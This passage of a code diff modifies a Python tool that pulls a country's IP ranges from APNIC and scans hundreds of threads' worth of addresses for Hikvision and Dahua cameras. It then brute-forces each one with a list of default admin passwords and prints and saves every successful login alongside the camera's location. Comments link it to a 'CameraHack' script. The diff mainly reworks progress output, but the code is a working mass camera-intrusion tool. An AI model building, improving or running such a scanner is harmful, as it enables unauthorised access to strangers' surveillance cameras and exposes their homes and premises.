@@ -35,7 +35,6 @@ except ImportError:
         YELLOW = '\033[93m'
         CYAN = '\033[96m'
         WHITE = '\033[97m'
-        MAGENTA = '\033[95m'
     class Style:
         RESET_ALL = '\033[0m'
 
@@ -47,7 +46,6 @@ DEFAULT_CREDENTIALS = [
     ("admin", "admin1122"),
     ("admin", "12345"),
     ("admin", "123456"),
-    ("admin", "12345678"),
     ("admin", "password"),
 ]
 
@@ -112,8 +110,43 @@ cctv_output_file = None
 found_count = 0
 rejected_count = 0  
 login_success_count = 0
-last_status_update = 0
-last_printed_ip = ""
+last_update_time = 0
+
+
+def update_status():
+    """Update the single line status with current progress"""
+    global last_update_time
+    current_time = time.time()
+    
+    # Update at most 20 times per second to avoid flickering
+    if current_time - last_update_time < 0.05:
+        return
+    
+    with results_lock:
+        current = scanned_count
+        total = total_ips
+        found = found_count
+        rejected = rejected_count
+    
+    if total > 0:
+        percentage = (current / total) * 100
+        elapsed = time.time() - start_time
+        speed = current / elapsed if elapsed > 0 else 0
+        
+        # Single line status with progress bar
+        bar_length = 20
+        filled = int(bar_length * current / total)
+        bar = '█' * filled + '░' * (bar_length - filled)
+        
+        status = f"\r{Fore.CYAN}[{bar}] {percentage:5.1f}%{Style.RESET_ALL} "
+        status += f"{Fore.GREEN}F:{found}{Style.RESET_ALL} "
+        status += f"{Fore.RED}R:{rejected}{Style.RESET_ALL} "
+        status += f"{Fore.YELLOW}{current}/{total}{Style.RESET_ALL} "
+        status += f"{Fore.WHITE}{speed:.0f}/s{Style.RESET_ALL}"
+        
+        sys.stdout.write(status)
+        sys.stdout.flush()
+        last_update_time = current_time
 
 
 def ip_range_to_list(start_ip: str, end_ip: str) -> List[str]:
@@ -444,67 +477,6 @@ class DahuaCameraValidator:
         return success, message
 
 
-def update_status_line(ip: str = ""):
-    """Update the status line with current progress (thread-safe)"""
-    global last_status_update, last_printed_ip
-    current_time = time.time()
-    
-    # Update at most 20 times per second to avoid flickering
-    if current_time - last_status_update < 0.05:
-        return
-    
-    with results_lock:
-        current = scanned_count
-        total = total_ips
-        found = found_count
-        rejected = rejected_count
-        login_success = login_success_count
-    
-    if total > 0:
-        percentage = (current / total) * 100
-        elapsed = time.time() - start_time
-        speed = current / elapsed if elapsed > 0 else 0
-        
-        # Create compact progress bar
-        bar_length = 20
-        filled = int(bar_length * current / total)
-        bar = '█' * filled + '░' * (bar_length - filled)
-        
-        # Compact single line status
-        status = f"\r{Fore.CYAN}[{bar}] {percentage:5.1f}%{Style.RESET_ALL} "
-        status += f"{Fore.GREEN}F:{found}{Style.RESET_ALL} "
-        status += f"{Fore.RED}R:{rejected}{Style.RESET_ALL} "
-        status += f"{Fore.MAGENTA}L:{login_success}{Style.RESET_ALL} "
-        status += f"{Fore.YELLOW}{current}/{total}{Style.RESET_ALL} "
-        status += f"{Fore.WHITE}{speed:.0f}/s{Style.RESET_ALL}"
-        
-        if ip:
-            status += f" {Fore.CYAN}{ip}{Style.RESET_ALL}"
-        
-        sys.stdout.write(status)
-        sys.stdout.flush()
-        last_status_update = current_time
-        last_printed_ip = ip
-
-
-def print_found_camera(ip: str, camera_type: str, port: int, url: str, username: str = None, password: str = None, is_login: bool = False):
-    """Print found camera in a clean single line format"""
-    global found_count, login_success_count
-    
-    # Clear the status line
-    sys.stdout.write('\r' + ' ' * 150 + '\r')
-    sys.stdout.flush()
-    
-    if is_login and username and password:
-        print(f"{Fore.GREEN}[✓] {camera_type} | {ip}:{port} | {username}:{password}{Style.RESET_ALL}")
-        with results_lock:
-            login_success_count += 1
-    else:
-        print(f"{Fore.GREEN}[+] {camera_type} | {ip}:{port}{Style.RESET_ALL}")
-        with results_lock:
-            found_count += 1
-
-
 def scan_single_ip_detection_only(ip: str, ports: List[int]) -> Optional[dict]:
     """
     Fast camera detection only (no login attempt) - Phase 1
@@ -513,8 +485,8 @@ def scan_single_ip_detection_only(ip: str, ports: List[int]) -> Optional[dict]:
     global scanned_count, total_ips, cctv_output_file, found_count, rejected_count
     
     try:
-        # Update status line with current IP
-        update_status_line(ip)
+        # Update status line
+        update_status()
         
         # Fast port scan first
         open_ports = fast_port_scan(ip, ports, timeout=0.15)
@@ -553,7 +525,7 @@ def scan_single_ip_detection_only(ip: str, ports: List[int]) -> Optional[dict]:
                 camera_found = True
         
         if camera_found and camera_type and camera_type != "Unknown Camera" and camera_type not in ["", "Unknown"]:
-            # Save camera detection info
+            # Save camera detection info immediately (only confirmed types)
             url = f"http://{ip}:{detected_port}" if detected_port == 8080 else f"http://{ip}"
             detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             
@@ -571,15 +543,21 @@ def scan_single_ip_detection_only(ip: str, ports: List[int]) -> Optional[dict]:
                 except:
                     pass
             
-            # Update counts
+            # Display detection with updated counts
             with results_lock:
                 scanned_count += 1
+                found_count += 1
+                current = scanned_count
+                total = total_ips
+                found = found_count
+                rejected = rejected_count
             
-            # Print found camera in single line
-            print_found_camera(ip, camera_type, detected_port, url)
+            # Clear line and print camera found
+            print()
+            print(f"{Fore.GREEN}[✓] Camera Found! {Fore.YELLOW}{camera_type}{Style.RESET_ALL} {Fore.CYAN}{ip}:{detected_port}{Style.RESET_ALL}")
             
-            # Restore status line
-            update_status_line()
+            # Continue status update
+            update_status()
             
             return {
                 'ip': ip,
@@ -604,12 +582,13 @@ def scan_single_ip_detection_only(ip: str, ports: List[int]) -> Optional[dict]:
 def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], ports: List[int]) -> Optional[dict]:
     """
     Scan IP for camera detection (fast find) then try login
+    Similar to W8CameraHackV2.py logic
     """
     global scanned_count, total_ips, cctv_output_file, found_count, rejected_count, login_success_count
     
     try:
-        # Update status line with current IP
-        update_status_line(ip)
+        # Update status line
+        update_status()
         
         # Fast port scan first
         open_ports = fast_port_scan(ip, ports, timeout=0.15)
@@ -647,7 +626,8 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                 camera_type = "Anjhua-Dahua Technology Camera"
                 camera_found = True
             elif detected_port in [80, 443, 8000, 8080]:
-                camera_found = True
+                # Camera port found but type unknown - will try login to determine
+                camera_found = True  # We'll try login but won't save until type is confirmed
         
         if camera_found:
             url = f"http://{ip}:{detected_port}" if detected_port == 8080 else f"http://{ip}"
@@ -655,6 +635,7 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
             
             # Only save and display if camera type is confirmed (not Unknown)
             if camera_type and camera_type != "Unknown Camera" and camera_type not in ["", "Unknown"]:
+                # Save camera detection info immediately (only confirmed types)
                 if cctv_output_file:
                     try:
                         with open(cctv_output_file, 'a', encoding='utf-8') as file:
@@ -669,15 +650,30 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                     except:
                         pass
                 
-                # Print found camera
-                print_found_camera(ip, camera_type, detected_port, url)
+                # Display detection
+                with results_lock:
+                    found_count += 1
+                    current = scanned_count + 1
+                    total = total_ips
+                    found = found_count
+                    rejected = rejected_count
+                    login_success = login_success_count
+                
+                print()
+                print(f"{Fore.GREEN}[✓] Camera Detected! {Fore.YELLOW}{camera_type}{Style.RESET_ALL} {Fore.CYAN}{ip}:{detected_port}{Style.RESET_ALL}")
             else:
-                # Camera found but type unknown - show status
-                sys.stdout.write('\r' + ' ' * 120 + '\r')
-                sys.stdout.flush()
-                print(f"{Fore.YELLOW}[?] Unknown camera | {ip}:{detected_port} | Trying login...{Style.RESET_ALL}")
+                # Camera port found but type unknown - try login first
+                print()
+                with results_lock:
+                    current = scanned_count + 1
+                    total = total_ips
+                    found = found_count
+                    rejected = rejected_count
+                    login_success = login_success_count
+                print(f"{Fore.YELLOW}[?] Port found at {ip}:{detected_port}, trying login...{Style.RESET_ALL}")
             
             # Now try credentials
+            # Determine if we should try Dahua first based on port or detected type
             is_dahua = (camera_type and ("Dahua" in camera_type or "Anjhua" in camera_type)) or detected_port in [37777, 554]
             
             for username, password in credentials:
@@ -686,9 +682,11 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                     validator.timeout = 1.5
                     success, message = validator.validate()
                     if success:
+                        # Update camera type if it was unknown
                         if not camera_type or camera_type == "Unknown Camera" or camera_type == "Unknown":
                             camera_type = "Anjhua-Dahua Technology Camera"
                         
+                        # Save detection info now that type is confirmed
                         detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                         if cctv_output_file:
                             try:
@@ -707,6 +705,7 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                         with results_lock:
                             scanned_count += 1
                             found_count += 1
+                            login_success_count += 1
                             valid_results.append({
                                 'ip': ip,
                                 'username': username,
@@ -717,10 +716,14 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                                 'open_ports': open_ports,
                                 'url': url
                             })
+                            current = scanned_count
+                            total = total_ips
+                            found = found_count
+                            rejected = rejected_count
+                            login_success = login_success_count
                         
-                        # Print login success
-                        print_found_camera(ip, camera_type, detected_port, url, username, password, is_login=True)
-                        update_status_line()
+                        print(f"{Fore.GREEN}[✓] LOGIN SUCCESS! {Fore.YELLOW}{camera_type}{Style.RESET_ALL} {Fore.CYAN}{ip}:{detected_port}{Style.RESET_ALL} {Fore.GREEN}{username}:{password}{Style.RESET_ALL}")
+                        update_status()
                         return {
                             'ip': ip,
                             'username': username,
@@ -737,8 +740,10 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                     validator.timeout = 1.5
                     success, message = validator.validate()
                     if success:
+                        # Update camera type to HIK Vision Camera
                         camera_type = "HIK Vision Camera"
                         
+                        # Save detection info now that type is confirmed
                         detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                         if cctv_output_file:
                             try:
@@ -757,6 +762,7 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                         with results_lock:
                             scanned_count += 1
                             found_count += 1
+                            login_success_count += 1
                             valid_results.append({
                                 'ip': ip,
                                 'username': username,
@@ -767,10 +773,14 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                                 'open_ports': open_ports,
                                 'url': url
                             })
+                            current = scanned_count
+                            total = total_ips
+                            found = found_count
+                            rejected = rejected_count
+                            login_success = login_success_count
                         
-                        # Print login success
-                        print_found_camera(ip, camera_type, detected_port, url, username, password, is_login=True)
-                        update_status_line()
+                        print(f"{Fore.GREEN}[✓] LOGIN SUCCESS! {Fore.YELLOW}{camera_type}{Style.RESET_ALL} {Fore.CYAN}{ip}:{detected_port}{Style.RESET_ALL} {Fore.GREEN}{username}:{password}{Style.RESET_ALL}")
+                        update_status()
                         return {
                             'ip': ip,
                             'username': username,
@@ -789,6 +799,7 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                     if success:
                         camera_type = "Anjhua-Dahua Technology Camera"
                         
+                        # Save detection info now that type is confirmed
                         detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                         if cctv_output_file:
                             try:
@@ -807,6 +818,7 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                         with results_lock:
                             scanned_count += 1
                             found_count += 1
+                            login_success_count += 1
                             valid_results.append({
                                 'ip': ip,
                                 'username': username,
@@ -817,10 +829,14 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
                                 'open_ports': open_ports,
                                 'url': url
                             })
+                            current = scanned_count
+                            total = total_ips
+                            found = found_count
+                            rejected = rejected_count
+                            login_success = login_success_count
                         
-                        # Print login success
-                        print_found_camera(ip, camera_type, detected_port, url, username, password, is_login=True)
-                        update_status_line()
+                        print(f"{Fore.GREEN}[✓] LOGIN SUCCESS! {Fore.YELLOW}{camera_type}{Style.RESET_ALL} {Fore.CYAN}{ip}:{detected_port}{Style.RESET_ALL} {Fore.GREEN}{username}:{password}{Style.RESET_ALL}")
+                        update_status()
                         return {
                             'ip': ip,
                             'username': username,
@@ -836,6 +852,14 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
             with results_lock:
                 scanned_count += 1
                 rejected_count += 1
+                current = scanned_count
+                total = total_ips
+                found = found_count
+                rejected = rejected_count
+                login_success = login_success_count
+            
+            print(f"{Fore.YELLOW}[-] No credentials for {ip}:{detected_port}{Style.RESET_ALL}")
+            update_status()
             return None
         
         with results_lock:
@@ -853,22 +877,31 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]], p
 def scan_single_ip(ip: str, credentials: List[Tuple[str, str]], ports: List[int]) -> Optional[dict]:
     """
     Scan a single IP address for cameras and try to login
+    Uses timeout protection to prevent hanging
+    
+    Args:
+        ip: IP address to scan
+        credentials: List of (username, password) tuples to try
+        ports: List of ports to check
+    
+    Returns:
+        Dictionary with results or None if no camera found
     """
     global scanned_count, total_ips
     
     try:
-        # Update status line with current IP
-        update_status_line(ip)
+        # Update status line
+        update_status()
         
         # Ultra-fast parallel port scan
-        open_ports = fast_port_scan(ip, ports, timeout=0.15)
+        open_ports = fast_port_scan(ip, ports, timeout=0.15)  # Ultra-short timeout
         
         if not open_ports:
             with results_lock:
                 scanned_count += 1
             return None
         
-        # Check if ports indicate camera
+        # Check if ports indicate camera (80, 443, 554, 37777, 8000)
         camera_ports = [p for p in open_ports if p in [80, 443, 554, 37777, 8000, 8080]]
         
         if not camera_ports:
@@ -876,20 +909,24 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]], ports: List[int]
                 scanned_count += 1
             return None
         
+        # Skip slow detection - use port-based quick detection
         detected_port = camera_ports[0]
+        # Quick port-based detection: 37777/554 = Dahua, others = try both
         is_dahua = detected_port in [37777, 554]
         
-        # Try credentials
+        # Try credentials immediately - try Dahua first if port suggests it, otherwise try both
         for username, password in credentials:
+            # Try Dahua first if port suggests it
             if is_dahua:
                 validator = DahuaCameraValidator(ip, username, password, detected_port)
-                validator.timeout = 1.5
+                validator.timeout = 1.5  # Very short timeout for speed
                 success, message = validator.validate()
                 if success:
                     with results_lock:
                         scanned_count += 1
-                    print_found_camera(ip, "Anjhua-Dahua", detected_port, f"http://{ip}", username, password, is_login=True)
-                    update_status_line()
+                    print()
+                    print(f"{Fore.GREEN}[✓] Found! {Fore.YELLOW}Anjhua-Dahua{Style.RESET_ALL} {Fore.CYAN}{ip}:{detected_port}{Style.RESET_ALL} {Fore.GREEN}{username}:{password}{Style.RESET_ALL}")
+                    update_status()
                     return {
                         'ip': ip,
                         'username': username,
@@ -900,14 +937,16 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]], ports: List[int]
                         'open_ports': open_ports
                     }
             else:
+                # Try Hikvision first for common ports (80, 443, 8000, 8080)
                 validator = HikvisionCameraValidator(ip, username, password, detected_port)
-                validator.timeout = 1.5
+                validator.timeout = 1.5  # Very short timeout for speed
                 success, message = validator.validate()
                 if success:
                     with results_lock:
                         scanned_count += 1
-                    print_found_camera(ip, "HIK Vision", detected_port, f"http://{ip}", username, password, is_login=True)
-                    update_status_line()
+                    print()
+                    print(f"{Fore.GREEN}[✓] Found! {Fore.YELLOW}HIK Vision{Style.RESET_ALL} {Fore.CYAN}{ip}:{detected_port}{Style.RESET_ALL} {Fore.GREEN}{username}:{password}{Style.RESET_ALL}")
+                    update_status()
                     return {
                         'ip': ip,
                         'username': username,
@@ -918,14 +957,16 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]], ports: List[int]
                         'open_ports': open_ports
                     }
                 
+                # If Hikvision failed, try Dahua as fallback
                 validator = DahuaCameraValidator(ip, username, password, detected_port)
-                validator.timeout = 1.5
+                validator.timeout = 1.5  # Very short timeout for speed
                 success, message = validator.validate()
                 if success:
                     with results_lock:
                         scanned_count += 1
-                    print_found_camera(ip, "Anjhua-Dahua", detected_port, f"http://{ip}", username, password, is_login=True)
-                    update_status_line()
+                    print()
+                    print(f"{Fore.GREEN}[✓] Found! {Fore.YELLOW}Anjhua-Dahua{Style.RESET_ALL} {Fore.CYAN}{ip}:{detected_port}{Style.RESET_ALL} {Fore.GREEN}{username}:{password}{Style.RESET_ALL}")
+                    update_status()
                     return {
                         'ip': ip,
                         'username': username,
@@ -936,11 +977,13 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]], ports: List[int]
                         'open_ports': open_ports
                     }
         
+        # No valid credentials found
         with results_lock:
             scanned_count += 1
         return None
         
     except Exception as e:
+        # Catch any unexpected errors to prevent hanging
         with results_lock:
             scanned_count += 1
         return None
@@ -949,6 +992,12 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]], ports: List[int]
 def scan_ip_range(start_ip: str, end_ip: str, credentials: List[Tuple[str, str]], max_workers: int = None):
     """
     Scan IP range for cameras with multi-threaded support
+    
+    Args:
+        start_ip: Starting IP address
+        end_ip: Ending IP address
+        credentials: List of credentials to try
+        max_workers: Number of threads (None = auto-detect CPU count)
     """
     global total_ips, scanned_count, valid_results, start_time, found_count, rejected_count, login_success_count
     
@@ -965,12 +1014,18 @@ def scan_ip_range(start_ip: str, end_ip: str, credentials: List[Tuple[str, str]]
         print(f"{Fore.RED}[!] Invalid IP range!{Style.RESET_ALL}")
         return
     
+    # Ports to scan (most common camera ports first for faster detection)
+    # Order: most common ports first (37777=Dahua, 554=RTSP, 80=HTTP most common)
     ports_to_scan = [80, 443, 554, 37777, 8000, 8080]
     
+    # Auto-detect CPU cores and use maximum threads for super fast scanning
     if max_workers is None:
         try:
+            import os
             cpu_count = os.cpu_count() or 4
-            max_workers = min(cpu_count * 10, 500)
+            # Use 10x CPU cores for maximum speed on I/O-bound operations
+            # For IP scanning, we can use many more threads since most time is waiting for network
+            max_workers = min(cpu_count * 10, 500)  # Very high thread count for maximum speed
         except:
             max_workers = 300
     
@@ -983,12 +1038,15 @@ def scan_ip_range(start_ip: str, end_ip: str, credentials: List[Tuple[str, str]]
     
     print(f"{Fore.GREEN}Scanning... Press Ctrl+C to stop{Style.RESET_ALL}\n")
     
+    # Use ThreadPoolExecutor for parallel scanning
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all IP scanning tasks
         future_to_ip = {
             executor.submit(scan_single_ip, ip, credentials, ports_to_scan): ip 
             for ip in ip_list
         }
         
+        # Process results as they complete
         for future in as_completed(future_to_ip):
             try:
                 result = future.result()
@@ -1006,7 +1064,7 @@ def scan_ip_range(start_ip: str, end_ip: str, credentials: List[Tuple[str, str]]
     print(f"Total IPs: {scanned_count}")
     print(f"Found: {Fore.GREEN}{found_count}{Style.RESET_ALL}")
     print(f"Rejected: {Fore.RED}{rejected_count}{Style.RESET_ALL}")
-    print(f"Login Success: {Fore.MAGENTA}{login_success_count}{Style.RESET_ALL}")
+    print(f"Login Success: {Fore.GREEN}{login_success_count}{Style.RESET_ALL}")
     print(f"Time: {elapsed:.2f}s")
     if elapsed > 0:
         print(f"Speed: {scanned_count/elapsed:.1f} IP/s")
@@ -1019,8 +1077,9 @@ def print_country_menu():
     print(f"{Fore.GREEN}Select Country (Total: {len(COUNTRIES)} Countries):{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
     
+    # Display in 3 columns for better organization
     countries_list = list(COUNTRIES.items())
-    rows = (len(countries_list) + 2) // 3
+    rows = (len(countries_list) + 2) // 3  # 3 columns
     
     for i in range(rows):
         row_str = ""
@@ -1036,7 +1095,7 @@ def print_country_menu():
 
 
 def fetch_country_ipv4_from_apnic(country_code: str) -> List[str]:
-    """Fetch IPv4 ranges for specified country from APNIC"""
+    """Fetch IPv4 ranges for specified country from APNIC (synchronous version)"""
     ipv4_list = []
     
     if not country_code:
@@ -1062,11 +1121,13 @@ def fetch_country_ipv4_from_apnic(country_code: str) -> List[str]:
             
             parts = line.split('|')
             
+            # Filter country IPv4 entries
             if len(parts) >= 7 and parts[1].upper() == country_code.upper() and parts[2].lower() == 'ipv4':
                 start_ip = parts[3]
                 count = int(parts[4])
                 ipv4_list.append(f"{start_ip}/{count}")
                 
+                # Show progress every 5 entries
                 if len(ipv4_list) % 5 == 0:
                     sys.stdout.write(f"\r{Fore.CYAN}[→] Found {len(ipv4_list)} {country_code} IPv4 ranges...{Style.RESET_ALL}")
                     sys.stdout.flush()
@@ -1110,11 +1171,13 @@ def save_ip_ranges_to_file(ipv4_list: List[str], file_path: str) -> bool:
 
 
 def load_country_ip_ranges(country_file: str, country_code: str = None, auto_fetch: bool = True) -> List[str]:
-    """Load IP ranges from country file. Auto-fetches from APNIC if file doesn't exist."""
+    """Load IP ranges from country file (format: IP/count). Auto-fetches from APNIC if file doesn't exist."""
     try:
+        # Try script directory first, then current directory
         script_path = os.path.join(SCRIPT_DIR, country_file)
         current_path = os.path.abspath(country_file)
         
+        # Determine which path to use
         file_path = None
         if os.path.exists(script_path):
             file_path = script_path
@@ -1123,13 +1186,16 @@ def load_country_ip_ranges(country_file: str, country_code: str = None, auto_fet
         elif os.path.exists(country_file):
             file_path = country_file
         
+        # If file doesn't exist and auto_fetch is enabled, fetch from APNIC
         if not file_path and auto_fetch and country_code:
             print(f"{Fore.YELLOW}[!] File not found: {country_file}{Style.RESET_ALL}")
             print(f"{Fore.CYAN}[*] Auto-fetching IP ranges from APNIC...{Style.RESET_ALL}\n")
             
+            # Fetch from APNIC
             ipv4_list = fetch_country_ipv4_from_apnic(country_code)
             
             if ipv4_list:
+                # Save to script directory
                 file_path = script_path
                 if save_ip_ranges_to_file(ipv4_list, file_path):
                     print(f"{Fore.GREEN}[✓] IP ranges saved successfully!{Style.RESET_ALL}\n")
@@ -1140,15 +1206,20 @@ def load_country_ip_ranges(country_file: str, country_code: str = None, auto_fet
                 print(f"{Fore.RED}[!] Failed to fetch IP ranges from APNIC{Style.RESET_ALL}")
                 return []
         
+        # If file still doesn't exist, show error
         if not file_path:
             print(f"{Fore.RED}[!] File not found: {country_file}{Style.RESET_ALL}")
             print(f"{Fore.YELLOW}[*] Checked paths:{Style.RESET_ALL}")
             print(f"    - Script directory: {script_path}")
             print(f"    - Current directory: {current_path}")
+            print(f"    - Relative path: {country_file}")
             if country_code:
                 print(f"{Fore.CYAN}[i] Tip: The file will be auto-generated on first use{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.YELLOW}[*] Please make sure the country IP file exists.{Style.RESET_ALL}")
             return []
         
+        # Load from existing file
         with open(file_path, 'r', encoding='utf-8') as f:
             ranges = [line.strip() for line in f if line.strip()]
         
@@ -1173,6 +1244,7 @@ def scan_country_cameras_detection_only(country: dict, max_workers: int = None):
     login_success_count = 0
     
     country_file = country['file']
+    # Use script directory for output file
     cctv_output_file = os.path.join(SCRIPT_DIR, f"{country['code']}_CCTV_Found.txt")
     
     print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
@@ -1181,13 +1253,17 @@ def scan_country_cameras_detection_only(country: dict, max_workers: int = None):
     print(f"{Fore.YELLOW}[*] Country: {country['name']} ({country['code']}){Style.RESET_ALL}")
     print(f"{Fore.YELLOW}[*] Output: {cctv_output_file}{Style.RESET_ALL}\n")
     
+    # Load IP ranges (auto-fetch from APNIC if file doesn't exist)
     ip_ranges = load_country_ip_ranges(country_file, country_code=country['code'], auto_fetch=True)
     if not ip_ranges:
         print(f"{Fore.RED}[!] No IP ranges loaded. Exiting...{Style.RESET_ALL}")
         return
     
+    print()  # Extra line for better formatting
+    
     print(f"{Fore.YELLOW}[*] Converting IP ranges to individual IPs...{Style.RESET_ALL}")
     
+    # Convert CIDR ranges to individual IPs
     ip_list = []
     for idx, cidr_range in enumerate(ip_ranges, 1):
         ips = cidr_to_ip_range(cidr_range)
@@ -1202,8 +1278,9 @@ def scan_country_cameras_detection_only(country: dict, max_workers: int = None):
         return
     
     total_ips = len(ip_list)
-    ports_to_scan = [80, 8080]
+    ports_to_scan = [80, 8080]  # Most common camera ports
     
+    # Auto-detect CPU cores
     if max_workers is None:
         try:
             cpu_count = os.cpu_count() or 4
@@ -1219,18 +1296,22 @@ def scan_country_cameras_detection_only(country: dict, max_workers: int = None):
     valid_results.clear()
     scanned_count = 0
     
+    # Clear output file
     try:
         if os.path.exists(cctv_output_file):
             os.remove(cctv_output_file)
     except:
         pass
     
+    # Use ThreadPoolExecutor for parallel scanning (detection only)
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all IP scanning tasks
         future_to_ip = {
             executor.submit(scan_single_ip_detection_only, ip, ports_to_scan): ip 
             for ip in ip_list
         }
         
+        # Process results as they complete
         for future in as_completed(future_to_ip):
             try:
                 result = future.result()
@@ -1240,9 +1321,9 @@ def scan_country_cameras_detection_only(country: dict, max_workers: int = None):
             except Exception:
                 pass
     
-    print()  # New line after status
+    # Print summary with all counts
     elapsed = time.time() - start_time
-    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+    print(f"\n\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}📊 SCAN COMPLETE{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
     print(f"Total IPs scanned: {scanned_count}")
@@ -1252,11 +1333,13 @@ def scan_country_cameras_detection_only(country: dict, max_workers: int = None):
     if elapsed > 0:
         print(f"Speed: {scanned_count/elapsed:.1f} IP/s")
     print(f"Results saved to: {Fore.YELLOW}{cctv_output_file}{Style.RESET_ALL}\n")
+    print(f"{Fore.CYAN}[*] Next step: Use option 2 to try login on saved cameras{Style.RESET_ALL}\n")
 
 
 def scan_country_cameras(country: dict, credentials: List[Tuple[str, str]], max_workers: int = None):
     """
     Scan country IP ranges for cameras (fast find then try login)
+    Similar to W8CameraHackV2.py but with login validation
     """
     global total_ips, scanned_count, valid_results, start_time, cctv_output_file, found_count, rejected_count, login_success_count
     
@@ -1266,6 +1349,7 @@ def scan_country_cameras(country: dict, credentials: List[Tuple[str, str]], max_
     login_success_count = 0
     
     country_file = country['file']
+    # Use script directory for output file
     cctv_output_file = os.path.join(SCRIPT_DIR, f"{country['code']}_CCTV_Found.txt")
     
     print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
@@ -1274,13 +1358,17 @@ def scan_country_cameras(country: dict, credentials: List[Tuple[str, str]], max_
     print(f"{Fore.YELLOW}[*] Country: {country['name']} ({country['code']}){Style.RESET_ALL}")
     print(f"{Fore.YELLOW}[*] Output: {cctv_output_file}{Style.RESET_ALL}\n")
     
+    # Load IP ranges (auto-fetch from APNIC if file doesn't exist)
     ip_ranges = load_country_ip_ranges(country_file, country_code=country['code'], auto_fetch=True)
     if not ip_ranges:
         print(f"{Fore.RED}[!] No IP ranges loaded. Exiting...{Style.RESET_ALL}")
         return
     
+    print()  # Extra line for better formatting
+    
     print(f"{Fore.YELLOW}[*] Converting IP ranges to individual IPs...{Style.RESET_ALL}")
     
+    # Convert CIDR ranges to individual IPs
     ip_list = []
     for idx, cidr_range in enumerate(ip_ranges, 1):
         ips = cidr_to_ip_range(cidr_range)
@@ -1295,8 +1383,9 @@ def scan_country_cameras(country: dict, credentials: List[Tuple[str, str]], max_
         return
     
     total_ips = len(ip_list)
-    ports_to_scan = [80, 8080]
+    ports_to_scan = [80, 8080]  # Most common camera ports
     
+    # Auto-detect CPU cores
     if max_workers is None:
         try:
             cpu_count = os.cpu_count() or 4
@@ -1312,33 +1401,38 @@ def scan_country_cameras(country: dict, credentials: List[Tuple[str, str]], max_
     valid_results.clear()
     scanned_count = 0
     
+    # Clear output file
     try:
         if os.path.exists(cctv_output_file):
             os.remove(cctv_output_file)
     except:
         pass
     
+    # Use ThreadPoolExecutor for parallel scanning
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all IP scanning tasks
         future_to_ip = {
             executor.submit(scan_single_ip_with_detection, ip, credentials, ports_to_scan): ip 
             for ip in ip_list
         }
         
+        # Process results as they complete
         for future in as_completed(future_to_ip):
             try:
                 result = future.result()
+                # Results are already handled in scan_single_ip_with_detection
             except Exception:
                 pass
     
-    print()  # New line after status
+    # Print summary with all counts
     elapsed = time.time() - start_time
-    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+    print(f"\n\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}📊 SCAN COMPLETE{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
     print(f"Total IPs scanned: {scanned_count}")
     print(f"Found: {Fore.GREEN}{found_count}{Style.RESET_ALL}")
     print(f"Rejected: {Fore.RED}{rejected_count}{Style.RESET_ALL}")
-    print(f"Login Success: {Fore.MAGENTA}{login_success_count}{Style.RESET_ALL}")
+    print(f"Login Success: {Fore.GREEN}{login_success_count}{Style.RESET_ALL}")
     print(f"Time: {elapsed:.2f}s")
     if elapsed > 0:
         print(f"Speed: {scanned_count/elapsed:.1f} IP/s")
@@ -1346,7 +1440,11 @@ def scan_country_cameras(country: dict, credentials: List[Tuple[str, str]], max_
 
 
 def get_geographic_location(ip: str) -> dict:
-    """Get geographic location information for an IP address"""
+    """
+    Get geographic location information for an IP address
+    Returns dict with country, region, city, postal_code, etc.
+    Uses multiple services with retry logic for better reliability
+    """
     location_info = {
         'country': 'Unknown',
         'region': 'Unknown',
@@ -1354,6 +1452,7 @@ def get_geographic_location(ip: str) -> dict:
         'postal_code': 'Unknown'
     }
     
+    # Try ip-api.com first (primary service)
     try:
         response = requests.get(f'http://ip-api.com/json/{ip}', timeout=8)
         if response.status_code == 200:
@@ -1363,10 +1462,14 @@ def get_geographic_location(ip: str) -> dict:
                 location_info['region'] = data.get('regionName', 'Unknown')
                 location_info['city'] = data.get('city', 'Unknown')
                 location_info['postal_code'] = data.get('zip', 'Unknown')
-                return location_info
+                
+                # If we got valid data, return it
+                if location_info['country'] != 'Unknown':
